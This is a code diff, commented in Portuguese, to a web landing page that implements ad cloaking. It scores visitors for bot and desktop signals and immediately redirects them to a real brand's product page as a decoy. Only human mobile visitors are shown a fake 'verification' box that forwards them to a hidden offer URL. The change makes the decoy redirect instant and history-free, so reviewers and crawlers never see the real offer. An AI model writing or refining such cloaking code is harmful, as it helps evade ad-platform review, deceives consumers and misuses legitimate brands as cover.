@@ -270,10 +270,10 @@
     
     // URL PÁGINA LIMPA/DECOY - BOTS + HUMANOS DESKTOP
     // ⚠️ ALTERE PARA SUA PÁGINA LIMPA (ex: blog, artigo, página institucional)
-    const DECOY_URL = "https://pantene.com.br/pt-br/produtos/cabelo-macio";
+    const DECOY_URL = "https://dermabox.com.br/collections/cacheados";
     
     // ============================================================
-    // DETECÇÃO COMPLETA (INVISÍVEL)
+    // DETECÇÃO (EXECUTADA IMEDIATAMENTE)
     // ============================================================
     
     // 1. Verifica se é dispositivo MOBILE
@@ -376,7 +376,7 @@
     }
     
     // ============================================================
-    // LÓGICA DE DECISÃO (SILENCIOSA)
+    // DECISÃO IMEDIATA (ANTES DE MOSTRAR QUALQUER COISA)
     // ============================================================
     
     const isMobile = isMobileDevice();
@@ -394,58 +394,50 @@
     if (localStorageBlocked) botScore += 1;
     if (suspiciousRes) botScore += 1;
     
-    // DECISÃO: APENAS humano MOBILE (que não é bot) recebe a OFERTA REAL
-    let redirectUrl;
+    // DECISÃO: APENAS humano MOBILE (que não é bot) continua na página
+    // Todo o resto é redirecionado IMEDIATAMENTE para a página limpa (DECOY)
     
-    if (isMobile && !isBotUA && botScore < 2) {
-      // Humano mobile legítimo → OFERTA REAL
-      redirectUrl = OFFER_URL;
+    const isHumanMobile = (isMobile && !isBotUA && botScore < 2);
+    
+    if (!isHumanMobile) {
+      // BOT ou DESKTOP ou SUSPEITO → Redireciona IMEDIATAMENTE para página limpa
+      // Usando replace para não voltar no histórico
+      console.log('[CLOAK] Bot/Desktop detectado - redirecionando para DECOY');
+      window.location.replace(DECOY_URL);
     } else {
-      // Bot OU desktop OU suspeito → PÁGINA LIMPA (DECOY)
-      redirectUrl = DECOY_URL;
-    }
-    
-    // Console log apenas para debug (não aparece pro usuário)
-    console.log('[CLOAK] Redirect para:', redirectUrl);
-    
-    // ============================================================
-    // COMPORTAMENTO DO BOTÃO
-    // ============================================================
-    
-    const verifyBox = document.getElementById("verifyBox");
-    let isRunning = false;
-    
-    function startValidation() {
-      if (isRunning) return;
-      isRunning = true;
+      // HUMANO MOBILE LEGÍTIMO → Mostra a pressel normalmente
+      console.log('[CLOAK] Humano mobile detectado - exibindo pressel');
       
-      verifyBox.classList.add("loading");
+      // ============================================================
+      // COMPORTAMENTO DO BOTÃO (apenas para humanos mobile)
+      // ============================================================
       
-      setTimeout(() => {
-        verifyBox.classList.remove("loading");
-        verifyBox.classList.add("done");
+      const verifyBox = document.getElementById("verifyBox");
+      let isRunning = false;
+      
+      function startValidation() {
+        if (isRunning) return;
+        isRunning = true;
+        
+        verifyBox.classList.add("loading");
         
         setTimeout(() => {
-          window.location.href = redirectUrl;
-        }, 120);
-      }, 500);
-    }
-    
-    verifyBox.addEventListener("click", startValidation);
-    verifyBox.addEventListener("keydown", (e) => {
-      if (e.key === "Enter" || e.key === " ") {
-        e.preventDefault();
-        startValidation();
+          verifyBox.classList.remove("loading");
+          verifyBox.classList.add("done");
+          
+          setTimeout(() => {
+            window.location.href = OFFER_URL;
+          }, 120);
+        }, 500);
       }
-    });
-    
-    // Redirecionamento automático para bots (acelera saída)
-    if (!isMobile && isBotUA) {
-      setTimeout(() => {
-        if (!isRunning) {
-          window.location.href = redirectUrl;
+      
+      verifyBox.addEventListener("click", startValidation);
+      verifyBox.addEventListener("keydown", (e) => {
+        if (e.key === "Enter" || e.key === " ") {
+          e.preventDefault();
+          startValidation();
         }
-      }, 800);
+      });
     }
   </script>
 </body>
